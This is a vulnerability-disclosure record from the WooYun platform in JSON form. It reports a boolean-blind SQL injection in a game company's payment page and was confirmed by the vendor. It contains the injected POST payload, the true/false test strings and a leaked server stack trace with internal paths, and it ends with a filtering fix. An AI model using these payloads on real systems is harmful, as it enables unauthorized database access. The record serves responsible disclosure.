{"id": 27447, "wybug_id": "wooyun-2015-0112345", "wybug_title": "电玩巴士某处SQL注入漏洞（有长度限制）", "wybug_corp": "电玩巴士", "wybug_author": "netwind", "wybug_date": "2015-05-06 09:35", "wybug_open_date": "2015-06-20 13:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-20：\t细节向公众公开  简要描述： 电玩巴士某BOOL型注入漏洞（有长度限制） 详细说明：  post数据\nctl00%24ContentPlaceHolder%24btn_edit=%c1%a2%bc%b4%b3%e4%d6%b5&ctl00%24ContentPlaceHolder%24droGameApp=107&ctl00%24ContentPlaceHolder%24package=15&ctl00%24ContentPlaceHolder%24ptname=admin' and lower(ascii(substring(db_name(),2,1)))<126--&ctl00%24ContentPlaceHolder%24ptname1=rpycaykj&__VIEWSTATE=/wEPDwUJOTk3MTgzMzA0D2QWAmYPZBYCAgkPZBYCAgMPZBYIZg8WAh4JaW5uZXJodG1sBQ/lroznvo7kuIDljaHpgJpkAgEPFgIfAAUM5pS75Z%2bO5o6g5ZywZAICDxAPFgYeDURhdGFUZXh0RmllbGQFB0FwcE5hbWUeDkRhdGFWYWx1ZUZpZWxkBQJJRB4LXyFEYXRhQm91bmRnZBAVAg9TMiDnvqTpm4TpgJDpub8PUzEg5qGD5Zut57uT5LmJFQIDMTA3AzEwNRQrAwJnZ2RkAgcPEGQPFgRmAgECAgIDFgQQBQIxNQUCMTVnEAUCMzAFAjMwZxAFAjUwBQI1MGcQBQMxMDAFAzEwMGdkZGTmxthQ5sMzLHfV%2b9v2/pS3VumxZA%3d%3d\n到http://pay.tgbus.com/payment/payinfo.aspx?gameid=71&id=21时ptname 存在注入漏洞ptname=admin' and 1=1--ptname=admin' and 1=2--返回不同页面这里ptname必须要填一个存在的用户 才能构成BOOL型注入否则就是时间注入了。另外直接加' 暴物理路径\n[SiteException: 引发类型为“Feixue.White.Framework.SiteException”的异常。]   Feixue.White.DataProvider.DataEngin.Execute(String module, String sql, ExcuteMode excuteMode) in D:\\公司项目\\TGBus_white\\Feixue.White\\Feixue.White.DataProvider\\DataEngin.cs:141   Feixue.White.DataProvider.DataEngin.Execute(String module, String sql) in D:\\公司项目\\TGBus_white\\Feixue.White\\Feixue.White.DataProvider\\DataEngin.cs:83   Feixue.White.UserProvider.UserEngin.Get(String username, Boolean isPostUC) in D:\\公司项目\\TGBus_white\\Feixue.White\\Feixue.White.UserProvider\\UserEngin.cs:515   Feixue.White.UserProvider.UserEngin.Get(String username) in D:\\公司项目\\TGBus_white\\Feixue.White\\Feixue.White.UserProvider\\UserEngin.cs:503   Feixue.White.UserProvider.UserEngin.GetByUCUID(String username) in D:\\公司项目\\TGBus_white\\Feixue.White\\Feixue.White.UserProvider\\UserEngin.cs:555   Feixue.White.Ucenter.WebSite.payment.PayInfo.btn_pay_Click(Object sender, EventArgs e) in D:\\公司项目\\TGBus_white\\Feixue.White\\Feixue.White.Ucenter.WebSite\\payment\\PayInfo.aspx.cs:8\n   漏洞证明：  用sqlmap猜解当前用户：\n\n不再深入。   修复方案：  参数加以过滤   版权声明：转载请注明来源 netwind@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-06 13:33 厂商回复： 感谢洞主对完美世界的关注，我们将尽快修补该漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}